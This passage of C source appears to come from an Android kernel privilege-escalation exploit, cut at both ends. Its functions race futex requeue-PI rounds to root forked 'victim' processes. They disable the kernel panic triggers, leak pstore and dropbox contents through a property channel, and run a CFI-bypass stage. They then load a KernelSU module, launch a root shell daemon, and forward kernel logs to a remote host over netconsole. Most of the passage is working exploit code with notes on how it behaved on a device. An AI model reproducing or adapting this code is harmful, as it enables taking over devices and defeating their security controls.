     it populates the device ARP cache so netpoll can resolve the host MAC at
     enable time.  Host listener sees this datagram => the path is proven; if it
     does not, the fault is the PATH, not netconsole. */
  int prime = -1, perrno = 0;
  if (host[0]) {
    int us = socket(AF_INET, SOCK_DGRAM, 0);
    if (us >= 0) {
      struct sockaddr_in sa;
      memset(&sa, 0, sizeof(sa));
      sa.sin_family = AF_INET;
      sa.sin_port = htons((unsigned short)strtoul(port, NULL, 10));
      sa.sin_addr.s_addr = inet_addr(host);
      char pay[64];
      int pn = snprintf(pay, sizeof(pay), "ZF9-NC-PRIME pid=%d\n", (int)getpid());
      prime = (int)sendto(us, pay, (size_t)pn, 0, (struct sockaddr *)&sa,
                          sizeof(sa));
      perrno = errno;
      close(us);
    } else {
      perrno = errno;
    }
  }
  pr_vwrite("[V-nc] prime host=%s port=%s r=%d errno=%d\n", host, port, prime,
            perrno);
  snprintf(out, sizeof(out),
           "nc-prime r=%d errno=%d to host=%s port=%s (host listener must log it)",
           prime, perrno, host, port);
  prop_chunk(202, 0, out);

  const char *dirp = "/sys/kernel/config/netconsole/zf9";
  mkdir(dirp, 0755);
  int r1 = nc_write(dirp, "dev_name", dev[0] ? dev : "eth0");
  int r2 = laddr[0] ? nc_write(dirp, "local_ip", laddr) : 0;
  int r3 = nc_write(dirp, "remote_ip", host);
  int r4 = mac[0] ? nc_write(dirp, "remote_mac", mac) : 0;
  int r5 = nc_write(dirp, "remote_port", port);
  int r6 = nc_write(dirp, "enabled", "1");
  pr_vwrite("[V-nc] install host=%s port=%s dev=%s local=%s mac=%s "
            "rc=%d/%d/%d/%d/%d/%d\n", host, port, dev, laddr, mac, r1, r2, r3,
            r4, r5, r6);
  snprintf(out, sizeof(out), "nc-install rc=%d/%d/%d/%d/%d/%d host=%s port=%s dev=%s",
           r1, r2, r3, r4, r5, r6, host, port, dev[0] ? dev : "eth0");
  prop_chunk(203, 0, out);
  if (r6 == 0) {
    /* verify: SysRq-h prints the SysRq help (= a harmless printk).  If the host
       sees it, this transport is live for every future panic. */
    int sf = open("/proc/sysrq-trigger", O_WRONLY);
    if (sf >= 0) {
      ssize_t w = write(sf, "h", 1);
      close(sf);
      pr_vwrite("[V-nc] sysrq-h sent (w=%zd) - check host UDP listener\n", w);
      snprintf(out, sizeof(out), "nc-verify sysrq-h sent w=%zd", w);
      prop_chunk(204, 0, out);
    } else {
      snprintf(out, sizeof(out), "nc-verify sysrq-trigger open failed errno=%d",
               errno);
      prop_chunk(204, 0, out);
    }
  }
}

static void pr_victim_probe(void) {
  char buf[256];
  buf[0] = 0;
  FILE *f = fopen("/proc/self/attr/current", "re");
  if (f) {
    if (fgets(buf, sizeof(buf), f)) {
      size_t n = strlen(buf);
      if (n && buf[n - 1] == '\n') {
        buf[n - 1] = 0;
      }
    }
    fclose(f);
  }
  /* ?119.8: every probe result goes out through the property channel (stdout is
     denied to this domain, and exec is denied too - so no shell child). */
  int seq = 100;
  char out[96];
  snprintf(out, sizeof(out), "attr=%s uid=%u euid=%u gid=%u egid=%u",
           buf, getuid(), geteuid(), getgid(), getegid());
  prop_chunk(seq++, 0, out);
  pr_vwrite("[V-probe] %s\n", out);

  /* exec test WITHOUT a shell: report the raw execve errno from a child. */
  /* §120.4 pstore verdict: mounted != backend exists.  /sys/fs/pstore can be
     mounted with no registered backend, in which case no node ever appears -
     a structural answer, not a filename guess.  Both the parameter and the
     directory are unreadable to shell (measured Permission denied). */
  {
    char b[64] = "?";
    FILE *bf = fopen("/sys/module/pstore/parameters/backend", "re");
    if (bf) {
      if (fgets(b, sizeof(b), bf)) {
        size_t n = strlen(b);
        if (n && b[n - 1] == '\n') {
          b[n - 1] = 0;
        }
      }
      fclose(bf);
    }
    snprintf(out, sizeof(out), "pstore-backend=[%s]", b);
    prop_chunk(seq++, 0, out);
    pr_vwrite("[V-probe] %s\n", out);
    DIR *pd = opendir("/sys/fs/pstore");
    if (pd) {
      struct dirent *e;
      int k = 0;
      while ((e = readdir(pd)) != NULL && k < 12) {
        if (e->d_name[0] == '.') {
          continue;
        }
        prop_chunk(seq++, 0, e->d_name);
        k++;
      }
      closedir(pd);
      prop_chunk(seq++, 0, k ? "pstore-listed" : "pstore-empty");
    } else {
      snprintf(out, sizeof(out), "pstore-opendir errno=%d", errno);
      prop_chunk(seq++, 0, out);
    }
  }

  /* §122.16 disarm EVERY panic trigger, not just panic_on_oops.  The armed run
     of §122.15 proved the arm is writable, yet the failure still reset the device
     with ZERO oops text and ZERO stall report in the 998 KB capture: so the reset
     came from a path that bypasses panic_on_oops - the rcu-stall trigger (device
     cmdline sets kernel.panic_on_rcu_stall=1) or a vendor BUG/hardware watchdog
     that fires before the 20 s soft-lockup detector can print.
     Disarming them all makes a failing run STALL AND STAY ALIVE, so the report
     lands in logcat (layer 1) instead of dying with the machine.
     Paths: panic_on_rcu_stall is a MODULE PARAM (not /proc/sys);
     hung_task_panic / softlockup_panic / panic_on_oops are /proc/sys/kernel.
     Each result is reported as write=N, so a failed write is visible, not assumed.
     NOTE: this is a FORENSICS-ONLY configuration - the production tool keeps the
     triggers armed (self-healing reboot is a feature, not a defect). */
  {
    static const char *dis[] = {
      "/proc/sys/kernel/panic_on_oops",
      "/proc/sys/kernel/panic_on_rcu_stall",          /* cmdline `kernel.X=1` => sysctl */
      "/sys/module/rcupdate/parameters/panic_on_rcu_stall", /* fallback: module param */
      "/proc/sys/kernel/hung_task_panic",
      "/proc/sys/kernel/softlockup_panic",
      "/proc/sys/kernel/panic_on_warn",
    };
    char rep[6][40];
    for (size_t i = 0; i < sizeof(dis) / sizeof(dis[0]); i++) {
      int fd = open(dis[i], O_WRONLY);
      int w = -1;
      int e = 0;
      if (fd >= 0) {
        w = (int)write(fd, "0\n", 2);
        e = errno;
        close(fd);
      } else {
        e = errno;
      }
      /* keep each entry short so 3 fit per 92-byte chunk */
      snprintf(rep[i], sizeof(rep[i]), "%s=%d/%d",
               i < 3 ? (i == 0 ? "oops" : i == 1 ? "rcu_stall" : "rcu_mod")
                     : (i == 3 ? "hung" : i == 4 ? "softlock" : "on_warn"), w, e);
    }
    prop_chunk(192, 0, rep[0]);
    char b2[200];
    snprintf(b2, sizeof(b2), "%s %s %s %s %s", rep[1], rep[2], rep[3], rep[4], rep[5]);
    prop_chunk(193, 0, b2);
    pr_vwrite("[V-probe] disarm 192=%s 193=%s\n", rep[0], b2);
  }

  /* §124.33 (A): in the victim-CFI modes the ladder must NOT run.  A SUCCESSFUL
     exec replaces the victim's own image (measured in QEMU: `exec
     /system/bin/app_process64 exit=0`), so the victim never reaches the CFI block
     that follows - and a successful exec leaves no AVC, no tombstone and no
     chunk, which is exactly the silent corpse observed on the device (§124.32).
     The ladder is diagnostic; the CFI stage is the mission - a diagnostic must
     never self-destruct the mission. */
  if (!g_victim_cfi) {
  prop_chunk(190, 0, "exec-ladder-enter");

  /* §120.5 exec ladder: init execs these itself, so a type_transition may allow
     them for the init domain even though /system/bin/sh is denied.  Any success
     = a two-hop path to a shell; the door is not welded shut yet.
     §122.12: `servicemanager` and `vold` are DAEMONS - a successful exec
     replaces the child image and never returns, so the parent's waitpid blocked
     forever (measured).  alarm(2) is preserved across execve, so a daemon image
     is terminated by SIGALRM after 2 s; a bounded WNOHANG loop + SIGKILL is the
     belt in case the image ignores/blocks SIGALRM.  A probe must never be able
     to block the chain. */
  {
    /* §122.23C: `servicemanager` and `vold` were REMOVED from the ladder - both
       are system daemons, and running a daemon image briefly (then killing it by
       alarm/abort) left stale locks/sockets that stopped the system's own daemons
       from starting (observed: `vdc: Waited 0ms for vold` retry loop every ~5 s,
       init.svc.zygote=restarting, framework never settled ⇒ the user-visible
       "stuck on the reboot screen").  Their only value was UX exploration of the
       two-hop path; the cost was system stability, so they are gone.  The two
       remaining candidates are non-daemon: app_process64 (a runtime that aborts
       quickly on bad args) and /vendor/bin/sh. */
    static const char *cands[] = {
      "/system/bin/app_process64", "/vendor/bin/sh",
    };
    for (size_t i = 0; i < sizeof(cands) / sizeof(cands[0]); i++) {
      pid_t q = fork();
      if (q == 0) {
        alarm(2);
        execl(cands[i], cands[i], "--help", (char *)NULL);
        _exit(errno ? errno : 127);
      }
      int qs = 0;
      if (q > 0) {
        int done = 0;
        for (int t = 0; t < 50; t++) {
          if (waitpid(q, &qs, WNOHANG) == q) {
            done = 1;
            break;
          }
          usleep(100000);                    /* up to 5 s */
        }
        if (!done) {
          kill(q, SIGKILL);
          waitpid(q, &qs, 0);
          snprintf(out, sizeof(out), "exec %s TIMEOUT-killed", cands[i]);
          prop_chunk(seq++, 0, out);
          pr_vwrite("[V-probe] %s\n", out);
          continue;
        }
      }
      snprintf(out, sizeof(out), "exec %s exit=%d", cands[i], qs >> 8);
      prop_chunk(seq++, 0, out);
      pr_vwrite("[V-probe] %s\n", out);
    }
    prop_chunk(191, 0, "exec-ladder-done");
  }
  }   /* !g_victim_cfi: the ladder is skipped in the victim-CFI modes (§124.33 A) */

  /* dropbox listing with readdir - no exec needed, closes ?114.3 #1 */
  DIR *d = opendir("/data/system/dropbox");
  if (d) {
    struct dirent *e;
    int k = 0;
    while ((e = readdir(d)) != NULL && k < 12) {
      if (e->d_name[0] == '.') {
        continue;
      }
      prop_chunk(seq++, 0, e->d_name);
      k++;
    }
    closedir(d);
    prop_chunk(seq++, 0, "dropbox-listed");
  } else {
    snprintf(out, sizeof(out), "dropbox errno=%d", errno);
    prop_chunk(seq++, 0, out);
  }

  /* sysrq permission test with the harmless 'h' (help) key */
  int fd = open("/proc/sysrq-trigger", O_WRONLY);
  if (fd >= 0) {
    ssize_t w = write(fd, "h", 1);
    snprintf(out, sizeof(out), "sysrq-h write=%zd errno=%d", w, errno);
    close(fd);
  } else {
    snprintf(out, sizeof(out), "sysrq open errno=%d", errno);
  }
  prop_chunk(seq++, 0, out);
  pr_vwrite("[V-probe] %s\n", out);
}

static void pr_victim_park(void) {
  /* §124.39 (1): birth heartbeat FIRST.  attempt 13 proved a victim can live
     and die without emitting a single line (no [V], no prop chunk) - the park
     entry itself must be observable, before any sleep/probe/exfil. */
  pr_vwrite("[V] PARK-ENTER pid=%d ppid=%d euid=%u comm=%s\n",
            (int)getpid(), (int)getppid(), geteuid(), PR_MAIN_COMM);
  {
    char bb[64];
    snprintf(bb, sizeof(bb), "PARK-ENTER pid=%d euid=%u", (int)getpid(), geteuid());
    prop_chunk(299, 0, bb);
  }
  for (;;) {
    sleep(1);
    if (geteuid() == 0) {
      pr_vwrite("[V] VICTIM-ROOT pid=%d uid=%u euid=%u gid=%u egid=%u comm=%s\n",
                (int)getpid(), getuid(), geteuid(), getgid(), getegid(),
                PR_MAIN_COMM);
      /* §122.11 #3: clear the previous run's persist residue FIRST, so this
         label's blocks are the only zfr.* content in the harvest. */
      pr_victim_clear_props();
      /* §122.11 #2: birth certificate from the PARENT's pre-seq snapshot. */
      {
        char bb[64];
        snprintf(bb, sizeof(bb), "BIRTH:%.16s", pr_boot_uuid);
        prop_chunk(99, 0, bb);
      }
      /* ?118.5: pstore FIRST - it is the only copy of the round-8 panic text and
         ramoops is a ring that any later panic resets. */
      pr_victim_exfil();
      /* §124.39 (2): the CFI stage runs BEFORE the probe.  attempt 13 proved a
         victim can live and die with zero output before reaching the stage; the
         probe (exec ladder + sysrq + dropbox, ~60 s of syscalls in a foreign
         domain) is the most likely place to hang.  Mission first, diagnostics
         after: birth -> exfil -> CFI stage -> probe -> netconsole -> cleanup. */
      /* §124.17 Option 1: THIS victim runs the CFI stage.  The shell domain got
         EACCES opening /dev/ashmem (§124.16), but this process is rooted and
         lives in the init domain (init_cred's security blob), which can open it.
         Wait for the parent's shared flag (the redirect round is the LAST seq
         step, 3+ rounds after the cred write that rooted us), then probe the open
         and run the stage.  The open errno is the Option-1 premise test. */
      if (g_victim_cfi) {
        pid_t pp = getppid();
        int waited = 0;
        /* 900 s covers sweep (<=40 probes) + the full 11-step seq with retries.
           Bail out early if the parent is gone (it gets reparented to init), so a
           dead parent cannot make the victim waste the whole window and block its
           own cleanup. */
        while (pr_cfi_ready != NULL && *pr_cfi_ready == 0 && waited < 900) {
          if (getppid() != pp) {
            break;
          }
          sleep(1);
          waited++;
        }
        int ready = pr_cfi_ready ? *pr_cfi_ready : -1;
        pr_vwrite("[V-cfi] ready=%d waited=%ds\n", ready, waited);
        errno = 0;
        int afd = open("/dev/ashmem", O_RDWR | O_CLOEXEC);
        int aerr = errno;
        pr_vwrite("[V-cfi] open(/dev/ashmem) fd=%d errno=%d (0=allowed)\n", afd,
                  aerr);
        {
          char cb[96];
          snprintf(cb, sizeof(cb), "victim-open-ashmem fd=%d errno=%d ready=%d",
                   afd, aerr, ready);
          prop_chunk(300, 0, cb);
        }
        if (afd >= 0) {
          close(afd);
        }
        if (ready != 1) {
          /* The parent's seq has not finished (the redirect is its LAST step);
             running the stage now would only produce misleading RW/RESTORE
             failures.  Report and let the cleanup window take over. */
          pr_vwrite("[V-cfi] redirect not landed (ready=%d) - stage skipped\n",
                    ready);
          prop_chunk(301, 0, "victim-cfi-stage SKIPPED (redirect not landed)");
        } else {
          int ok = cfi_stage((unsigned char *)pmap_buf_addr(), dmap_alias());
          {
            char cb[96];
            snprintf(cb, sizeof(cb), "victim-cfi-stage %s", ok ? "OK" : "FAIL");
            prop_chunk(301, 0, cb);
          }
          pr_vwrite("[V-cfi] cfi_stage %s\n", ok ? "OK" : "FAIL");
          /* §124.20 the last step of the chain: load KernelSU late-load style.
             We are uid 0 with (now) SELinux permissive, so the module load needs
             no r/w primitive at all - just finit_module on the pushed .ko.  The
             .ko must be built for 5.10.205-android12-9 (vermagic/KMI exact). */
          if (ok) {
            const char *ko = "/data/local/tmp/kernelsu.ko";
            int kfd = open(ko, O_RDONLY | O_CLOEXEC);
            if (kfd < 0) {
              char cb[128];
              snprintf(cb, sizeof(cb), "finit_module open %s errno=%d", ko, errno);
              prop_chunk(302, 0, cb);
              pr_vwrite("[V-cfi] %s\n", cb);
            } else {
              long fr = syscall(313 /* SYS_finit_module */, kfd, "kernelsu.ko", 0);
              int fe = errno;
              char cb[128];
              snprintf(cb, sizeof(cb), "finit_module ret=%ld errno=%d%s", fr, fe,
                       (fr == 0) ? " KSU-LOADED" : "");
              prop_chunk(302, 0, cb);
              pr_vwrite("[V-cfi] %s\n", cb);
              close(kfd);
            }
          }
          /* KSU 端接管後的狀態回報（若模組已載入） */
          if (ok && access("/data/adb/ksud", X_OK) == 0) {
            prop_chunk(303, 0, "ksud present");
          }
          /* §124.20 root shell: this victim is uid 0 with (now) permissive
             SELinux, so the S22U-derived socket daemon can serve a real root
             shell.  It must be started BY the victim - our device's UMH is
             neutered (CONFIG_STATIC_USERMODEHELPER_PATH=""), so S22U's
             UMH-launched variant is unusable here. */
          if (ok) {
            pid_t d = fork();
            if (d == 0) {
              execl("/data/local/tmp/zf9su", "zf9su", "--daemon", (char *)NULL);
              _exit(127);
            }
            char cb[160];
            snprintf(cb, sizeof(cb),
                     "zf9su daemon pid=%d (client: /data/local/tmp/zf9su -c 'id')",
                     (int)d);
            prop_chunk(304, 0, cb);
            pr_vwrite("[V-cfi] %s\n", cb);
          }
        }
      }
      /* §124.39 (2, cont): the probe runs AFTER the stage (moved down from
         above).  Wait well past the round's write before forking the probe's
         shell: the probe must not create a process inside the tail-read
         window (?115.1). */
      sleep(5);
      pr_victim_probe();
      /* §122.11 #1: the 200..204 stall was deterministic across three runs, so
         the probe→netconsole boundary gets its own marker: 209 present ⇒ the
         probe returned and the netconsole entry was reached; 209 absent ⇒ the
         stall is inside the probe itself. */
      prop_chunk(209, 0, "nc-call-enter");
      pr_victim_netconsole();
      /* ?117: clean exit.  On the device the parent is only `shell` and cannot
         write /proc/sysrq-trigger (mode 0200 root), but this victim (uid 0) can.
         Give the operator/tool a window to collect the probe output, then
         sync + emergency_restart (SysRq-b), which skips device_shutdown and so
         never touches the async_lock word our cad_pid read poisoned. */
      pr_vwrite("[V] clean exit in %ds: sync + 'b' > /proc/sysrq-trigger\n",
                g_forensic ? FORENSIC_WINDOW_S : 30);
      /* §122.19 forensic mode: after disarming the panic triggers (192/193) the
         machine no longer self-heals, so the ONLY safe recovery is this delayed
         sysrq-b - `adb reboot` may wedge (the async_lock BRK is a non-fatal oops
         once panic_on_oops=0, so the reboot syscall dies half-way and the machine
         never comes back).  A DONE run's victim would otherwise reboot at +30 s
         and wipe the disarm, so forensic mode waits the whole collection window
         (default 20 min) and only then does sync + emergency_restart. */
      sleep(g_forensic ? FORENSIC_WINDOW_S : 30);
      sync();
      {
        int fd = open("/proc/sysrq-trigger", O_WRONLY);
        if (fd >= 0) {
          ssize_t w = write(fd, "b", 1);
          pr_vwrite("[V] sysrq b write=%zd errno=%d\n", w, errno);
          close(fd);
        } else {
          pr_vwrite("[V] sysrq open failed errno=%d; fallback reboot()\n", errno);
        }
      }
      syscall(SYS_reboot, LINUX_REBOOT_MAGIC1, LINUX_REBOOT_MAGIC2,
              LINUX_REBOOT_CMD_POWER_OFF, NULL);
      for (;;) {
        pause();
      }
    }
  }
}

static void pr_fork_victim_burst(void) {
  for (int i = 0; i < PR_VICTIM_BURST; i++) {
    pid_t p = fork();
    if (p == 0) {
      pr_victim_park();
      _exit(0);
    }
    if (p < 0) {
      break;
    }
    pr_victims_forked++;
  }
  pr_info("victim burst forked for round r=%d (total %d) - tail is now ours\n",
          pr_victim_rounds, pr_victims_forked);
}

static void *pr_consumer(void *a __attribute__((unused))) {
  disable_rseq_for_thread();
  pin_to_core(CONSUMER_CORE);
  int seen = 0;
  for (;;) {
    if (atomic_load(&pr_stop)) {
      return NULL;
    }
    int seq = atomic_load(&pr_consumer_go);
    if (seq == 0 || seq == seen) {
      sched_yield();
      continue;
    }
    seen = seq;
    int tid = atomic_load(&pr_waiter_tid);
    /* Gate: wait until the waiter is ACTUALLY blocked in pselect6, so the
       overlay is on its kernel stack before we walk it.  A plain "state == S"
       poll cannot tell "blocked in pselect6" from "blocked in some other
       syscall" (e.g. futex LOCK_PI), and walking the wrong stack is exactly the
       intermittent +0x188 garbage-address panic (see STATUS ?85.4). */
    if (pr_gate_syscall) {
      int spins = 0;
      while (!atomic_load(&pr_stop) &&
             (atomic_load(&pr_pselect_epoch) != seq ||
              !pr_thread_in_pselect(tid)) &&
             spins < 40000) {
        usleep(100);
        spins++;
      }
    }
    int calls = 0;
    while (!atomic_load(&pr_stop) &&
           atomic_load(&pr_consumer_go) == seq &&
           calls < CONSUMER_MAX_CALLS) {
      if (calls == 0 && seq == pr_victim_rounds) {
        /* fork the victims microseconds before the write lands (?113.30) */
        pr_fork_victim_burst();
      }
      errno = 0;
      int nice = PSELECT_CONSUMER_NICE;
      if (pr_cycle_prio) {
        nice -= (atomic_load(&pr_cur_round) & 1);
      }
        if (pr_pselect_only()) {
        pr_trace("pselect-only-skip-sched-setattr", tid, 0);
        atomic_store(&pr_consumer_go, 0);
        break;
      }
      pr_record_sched_snapshot("before-sched-getattr", tid);
      pr_trace("before-sched-setattr", tid, 0);
      long r = sched_setattr_tid(tid, nice);
      int r_errno = errno;
      pr_record_sched_snapshot("after-sched-getattr", tid);
      pr_trace("after-sched-setattr", r, r_errno);
      atomic_fetch_add(&pr_consumer_calls, 1);
      if (r == 0) {
        atomic_fetch_add(&pr_consumer_ok, 1);
      } else {
        pr_info("persist consumer sched ret=%ld errno=%d tid=%d\n",
                r, r_errno, tid);
      }
      calls++;
    }
    if (0 && pr_wake[1] >= 0 && calls > 0) {
      ssize_t wr = write(pr_wake[1], "w", 1);
      (void)wr;
    }
  }
}

/* forward: the waiter and the owner both park here (?113.24 #1 / ?115.3) */
static void pr_owner_park_forever(void);

/* ?115.3 waiter rotation - same argument as the (i-b) owner pool: remove_waiter()
   uses `current` (the WAITER thread), so this round's overlay-stack node lands in
   the waiter's OWN pi_waiters tree.  With one persistent waiter that tree
   accumulates across rounds, and a later round's task_blocks_on_rt_mutex walks a
   stale stack node -> the ?113.22/?113.23 panic (measured ~1/3 of 6-step runs in
   QEMU, no kprobes).  Rotating the waiter and PARKING the old ones (so no stale
   node points into a freed stack) gives every round a virgin tree. */
static void *pr_waiter(void *a) {
  disable_rseq_for_thread();
  pin_to_core(CORE);
  int r = (int)(intptr_t)a;            /* one spawn == one round */
  int idx = r - 1;
  atomic_store(&pr_waiter_tid, (int)syscall(SYS_gettid));
  /* SIGALRM trigger for slide rounds (see slide.c slide_waiter_thread): the
     handler does setpriority() on the calling thread, which forces the on-mutex
     prio adjustment that arms the bug.  Only this thread unblocks SIGALRM. */
  struct sigaction sa;
  memset(&sa, 0, sizeof(sa));
  sa.sa_handler = pr_alarm_handler;
  sigemptyset(&sa.sa_mask);
  sigaction(SIGALRM, &sa, NULL);
  /* §124.121 seqoverlay: SIGUSR1 handler runs the SEQPACKET overlay sendmsg
     ON this (waiter) thread while blocked in FUTEX_WAIT_REQUEUE_PI. */
  if (seqoverlay_enabled()) {
    struct sigaction sa2;
    memset(&sa2, 0, sizeof(sa2));
    sa2.sa_handler = seqoverlay_handler;
    sigemptyset(&sa2.sa_mask);
    sigaddset(&sa2.sa_mask, SIGUSR1);
    sigaction(SIGUSR1, &sa2, NULL);
  }
  sigset_t unblk;
  sigemptyset(&unblk);
  sigaddset(&unblk, SIGALRM);
  if (seqoverlay_enabled()) {
    sigaddset(&unblk, SIGUSR1);
  }
  pthread_sigmask(SIG_UNBLOCK, &unblk, NULL);

  {
    int slide = pr_slide_this_round;
    long lret = futex_op(&pr_chain[idx], FUTEX_LOCK_PI, 0, NULL, NULL, 0);
    int lerrno = errno;
    pr_info("persist waiter r=%d chain lock ret=%ld errno=%d slide=%d\n",
            r, lret, lerrno, slide);
    atomic_store(&pr_waiter_ready, r);
    while (atomic_load(&pr_owner_ready) != r) {
      sched_yield();
    }
    struct timespec ts;
    SYSCHK(clock_gettime(CLOCK_MONOTONIC, &ts));
    ts.tv_sec += slide ? 2 : ROUTE_WAIT_SECONDS;
    atomic_store(&pr_waiter_inwait, r);   /* §124.124: overlay landing gate */
    pr_trace("before-wait-requeue", r, 0);
    errno = 0;
    long wait_ret = futex_op(&pr_wait[idx], FUTEX_WAIT_REQUEUE_PI, 0, &ts,
                            &pr_target[idx], 0);
    int wait_errno = errno;
    pr_trace("after-wait-requeue", wait_ret, wait_errno);
    if (pr_requeue_only()) {
      pr_trace("requeue-only-skip-overlay", r, 0);
      futex_op(&pr_chain[idx], FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
    } else if (slide) {
      /* slide.c's ordering: release the chain BEFORE printing the overlay */
      futex_op(&pr_chain[idx], FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
      pr_overlay_round(idx, 1);
    } else {
      pr_overlay_round(idx, 0);
      futex_op(&pr_chain[idx], FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
    }
    atomic_store(&pr_round_done, r);
    while (atomic_load(&pr_owner_released) != r &&
           !atomic_load(&pr_stop)) {
      sched_yield();
    }
  }
  pr_owner_park_forever();   /* parked, never exits: stale nodes stay mapped */
  return NULL;               /* unreachable */
}

/* ?115.3: pool bound shared with the owners (each round consumes 1 owner + 1
   waiter; the device seq is 6 rounds, QEMU `seq 64` needs 128 <= 160). */
#define PR_OWNER_POOL 160
/* ?113.30: one tail-read retry fits the 24 zerolock slots */
#define PR_TAIL_RETRIES 6
static int pr_owner_spawned;
static int pr_waiter_spawned;

static int pr_waiter_spawn(int r) {
  if (pr_waiter_spawned >= PR_OWNER_POOL) {
    pr_error("waiter pool exhausted (%d >= %d): clean abort\n",
             pr_waiter_spawned, PR_OWNER_POOL);
    return -1;
  }
  pthread_t t;
  if (pthread_create(&t, NULL, pr_waiter, (void *)(intptr_t)r) != 0) {
    pr_error("waiter spawn failed r=%d\n", r);
    return -1;
  }
  pthread_detach(t);
  pr_waiter_spawned++;
  return 0;
}

/* ?113.24 (i-b) boundary #1: after its round the owner must NEVER reach
   do_exit().  exit_pi_state_list() (kernel/futex.c:842-911, ending in
   rt_mutex_futex_unlock at :905) walks rt_mutex waiters + the owner's
   pi_waiters - exactly where this round's poison lives.  The park loop takes
   no unwind path: every signal wakeup re-parks, so the thread never returns. */
static void pr_owner_park_forever(void) {
  /* futex_wait on a private word that is never changed: never returns, immune
     to signals (an EINTR wakeup just re-waits), and burns no CPU - 160 parked
     owners cost nothing on the device's single allowed core. */
  static uint32_t park_word;
  for (;;) {
    futex_op(&park_word, FUTEX_WAIT, 0, NULL, NULL, 0);
  }
}

static void *pr_owner(void *a) {
  disable_rseq_for_thread();
  int r = (int)(intptr_t)a; /* one spawn == one round, one fresh tree (i-b #2) */
  int idx = r - 1;
  long tret = futex_op(&pr_target[idx], FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  int terrno = errno;
  pr_info("persist owner r=%d target lock ret=%ld errno=%d\n",
          r, tret, terrno);
  atomic_store(&pr_owner_ready, r);
  /* must wait until the waiter owns the chain futex, else we could grab it
     first and deadlock the round */
  while (atomic_load(&pr_waiter_ready) != r &&
         !atomic_load(&pr_stop)) {
    sched_yield();
  }
  futex_op(&pr_chain[idx], FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  /* ?113.24 (i-b) invariant: every abort happens at a round BOUNDARY.  If the
     driver abandons the round early (pr_stop) the owner must still not spin
     forever - it unlocks and parks (still zero exit path). */
  while (atomic_load(&pr_release) != r && !atomic_load(&pr_stop)) {
    sched_yield();
  }
  futex_op(&pr_chain[idx], FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
  futex_op(&pr_target[idx], FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
  atomic_store(&pr_owner_released, r);
  pr_owner_park_forever();
  return NULL; /* unreachable */
}

/* ?113.24 (i-b) #3: the pool size is a DEVICE parameter (the device runs
   `seq 64`), each round consumes one owner, and owners are NEVER reused -
   reusing one restores the accumulated pi_waiters poison this fix removes.
   Exhaustion is therefore a clean abort, not a recycle.
   Account: every round takes one owner, including the read/verify/cred rounds
   (slide + tail + verify + cred x2 = 5), so the device seq burns 64+5 = 69 of
   160 - the margin is deliberate.  Re-check this line when PR_ROUNDS or the
   seq table changes. */
static int pr_owner_spawn(int r) {
  if (pr_owner_spawned >= PR_OWNER_POOL) {
    pr_error("owner pool exhausted (%d >= %d): clean abort, owners are never "
             "reused (?113.24 i-b #3)\n", pr_owner_spawned, PR_OWNER_POOL);
    return -1;
  }
  pthread_t t;
  int rc = pthread_create(&t, NULL, pr_owner, (void *)(intptr_t)r);
  if (rc != 0) {
    pr_error("owner spawn failed r=%d rc=%d\n", r, rc);
    return -1;
  }
  pthread_detach(t);
  pr_owner_spawned++;
  pr_info("persist owner spawned r=%d (pool %d/%d, parked owners are never "
          "reused)\n", r, pr_owner_spawned, PR_OWNER_POOL);
  return 0;
}

void persist_set_probe_deltas(int on) {
  pr_probe_deltas = on ? 1 : 0;
}

void persist_set_slide_rounds(int n) {
  pr_slide_rounds = n;
}

/* EXPERIMENT: neutralise the round-varying page fields so one page can serve any
   round.  The overlay word table already carries parent/right/left for both
   tree_entry and pi_tree_entry; if the page's fake_w0 copy is not needed, an
   RB_EMPTY_NODE fake_w0 + owner=0 makes the page round-invariant. */
void persist_set_skip_sigalrm(int on) { pr_skip_sigalrm = on ? 1 : 0; }

void persist_set_cycle_prio(int on) { pr_cycle_prio = on ? 1 : 0; }

void persist_set_cycle_ovl(int on) { pr_cycle_ovl = on ? 1 : 0; }

void persist_set_seq_cfi(int on) { pr_seq_cfi = on ? 1 : 0; }
void persist_set_seq_vcfimin(int on) { pr_seq_vcfi_min = on ? 1 : 0; }
/* §124.46: select the nsproxy slide anchor (default: loggers).
   §124.94: value 2 = tasksprev anchor (token `slidetp`). */
void persist_set_slide_ns(int on) { pr_slide_ns = on; }

void persist_set_seq(int on) {
  pr_seq = on ? 1 : 0;
  if (on) {
    /* ?113.21: mark the driving (main) thread so the verify round can tell it
       apart from a helper thread - on the device every thread is confined to
       cpu 0, so entry_task[0] may legitimately be any of ours. */
    prctl(PR_SET_NAME, PR_MAIN_COMM);
  }
}
void persist_set_sweep(int on) { pr_sweep = on ? 1 : 0; }
/* the bootstrap needs some candidate before the first round: use grid entry 0 so
the device path never depends on pagemap */
uintptr_t persist_sweep_first_phys(void) { return pr_sweep_phys_pair(0, 0); }

/* §124.27: start the sweep grid at entry N (delta-major, then candidate).  Used
   to force a run to hit a DIFFERENT candidate page: the decisive experiment that
   separates a "page-shaped step-2 defect" (different candidate => step 2
   survives) from a step-2 defect that is page-independent (any candidate => step
   2 dies).  Must be applied AFTER the `sweep` token (which bootstraps entry 0). */
void persist_set_sweep_start(int n) {
  if (n < 0) {
    n = 0;
  }
  int k = n % (pr_sweep_ndeltas * PR_SWEEP_CANDS);
  pr_sweep_d = k / PR_SWEEP_CANDS;
  pr_sweep_c = k % PR_SWEEP_CANDS;
  g_pmap_phys_wanted = pr_sweep_phys_pair(pr_sweep_d, pr_sweep_c);
  pr_info("sweep start at entry %d (d=%d c=%d phys=%016zx)\n", k, pr_sweep_d,
          pr_sweep_c, (size_t)g_pmap_phys_wanted);
}

/* §124.38: reverse sweep (high-to-low) + end marker.  `sweeprev` flips the
   walk direction (sweepstart=N then runs N, N-1, ...); `sweepend=M` stops the
   run cleanly when the next entry would pass M (direction-aware), so a
   finished sweep exits instead of wrapping into known killers.  Both must be
   applied AFTER the `sweep` token. */
/* §124.54: static skip list.  `sweepskip=N[,M...]` permanently skips grid
   entries proven dead across boots (n=3: five consecutive walk-instant deaths
   on 0x83d159000 with no DT/CMA cover = fixed noise, not layout).  Applied
   AFTER `sweep`; comma-separated, max 8. */
#define PR_SWEEP_SKIP_MAX 64
static int pr_sweep_skip[PR_SWEEP_SKIP_MAX];
static int pr_sweep_nskip;
